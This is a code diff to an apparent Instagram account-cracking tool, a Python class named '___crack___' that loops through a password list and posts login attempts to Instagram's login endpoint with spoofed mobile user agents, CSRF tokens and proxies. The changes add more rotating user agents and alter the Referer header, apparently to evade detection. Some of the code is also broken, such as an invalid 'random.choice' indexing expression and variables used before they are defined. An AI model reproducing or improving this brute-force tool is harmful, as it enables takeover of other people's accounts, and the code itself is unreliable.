@@ -408,12 +408,16 @@ class ___crack___:
         try:
             ___useragent = open('Data/ua.txt', 'r').read()
         except (IOError):
-            ___useragent = random.choice['___ua1']['___ua2']['___ua3']['___ua4']['___ua5']
+            ___useragent = random.choice['___ua1']['___ua2']['___ua3']['___ua4']['___ua5']['___ua6']['___ua7']['___ua8']['___ua9']
             ___ua1 = ('Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36')
             ___ua2 = ('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36')
             ___ua3 = ('Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
             ___ua4 = ('Mozilla/5.0 (Linux; Android 10; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
-                    
+            ___ua5 = ('Mozilla/5.0 (Linux; Android 10; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
+            ___ua6 = ('Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
+            ___ua7 = ('Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
+            ___ua8 = ('Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
+            ___ua9 = ('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')        
          try:
             for pw in pwx:
                 pw = pw.lower()
@@ -427,7 +431,7 @@ class ___crack___:
                 'optIntoOneTap': 'false'}
                 ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
-                'Referer': 'https://i.instagram.com/accounts/login/',
+                'Referer': 'https://z-p42.www.instagram.com/accounts/login/',
                 'x-csrftoken': ___csrf}
                 with requests.Session() as ses:
                     response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
